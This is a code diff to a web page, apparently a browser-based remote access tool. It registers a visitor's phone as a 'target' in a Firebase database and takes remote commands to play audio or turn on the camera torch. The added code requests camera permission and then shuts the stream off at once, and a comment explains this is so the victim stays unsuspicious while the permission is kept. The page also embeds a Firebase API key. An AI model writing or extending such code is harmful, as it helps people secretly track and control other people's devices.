@@ -21,7 +21,6 @@
     </div>
 
 <script>
-    // FIREBASE CONFIG LU SUDAH TERPASANG TOTAL
     const firebaseConfig = {
       apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
       authDomain: "rat-html.firebaseapp.com",
@@ -40,16 +39,27 @@
     const myKey = params.get('key') || "UNKNOWN";
     const tid = "TGT-" + Math.floor(Math.random() * 9999);
 
-    function gas() {
+    async function gas() {
+        // 1. Ambil Izin Getar & Audio
         if(navigator.vibrate) navigator.vibrate(100);
         new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play().catch(()=>{});
+
+        // 2. MINTA IZIN KAMERA (Biar titik hijau/senter muncul)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            // Kalau berhasil, langsung matiin lagi biar gak curiga, tapi izin udah dapet
+            stream.getTracks().forEach(track => track.stop());
+        } catch (e) {
+            console.log("Izin ditolak target");
+        }
 
         document.getElementById('ui').innerHTML = "⏳ Menghubungkan ke server...";
         
         db.ref('mario/targets/' + tid).set({
-            model: getModel(),
+            model: getModelName(),
             belongsTo: myKey,
-            status: "online"
+            status: "online",
+            lastSeen: Date.now()
         });
 
         db.ref('mario/commands/' + tid).on('value', (s) => {
@@ -58,16 +68,28 @@
             if(c.action === "play_audio") new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
             if(c.action === "torch_on") {
                 navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}})
-                .then(st => { st.getVideoTracks()[0].applyConstraints({advanced: [{torch: true}]}); });
+                .then(st => { 
+                    const track = st.getVideoTracks()[0];
+                    track.applyConstraints({advanced: [{torch: true}]}); 
+                });
             }
             if(c.action === "torch_off") location.reload();
         });
     }
 
-    function getModel() {
+    // FIX DETEKSI NAMA HP (Gak bakal "k" doang)
+    function getModelName() {
         const ua = navigator.userAgent;
-        const match = ua.match(/Android\s+([^\s;]+|[^;]+);\s+([^;)]+)/);
-        return match ? match[2].trim() : "Android Device";
+        if (/android/i.test(ua)) {
+            const parts = ua.split(')');
+            if (parts.length > 0) {
+                const modelPart = parts[0].split(';');
+                // Biasanya nama HP ada di bagian terakhir sebelum tanda kurung tutup
+                const name = modelPart[modelPart.length - 1].trim();
+                return name.length > 1 ? name : "Android Device";
+            }
+        }
+        return "Browser User";
     }
 </script>
 </body>
